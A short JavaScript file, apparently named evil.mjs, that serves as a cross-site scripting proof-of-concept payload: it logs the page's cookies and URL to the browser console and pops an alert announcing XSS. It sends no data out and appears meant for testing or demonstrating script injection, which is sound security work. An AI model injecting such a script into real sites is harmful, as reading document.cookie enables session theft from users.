console.log("Execute evil.mjs");
console.table({
    cookie: document.cookie,
    location: window.location.href,
})
window.alert("XSS in " + location.href);

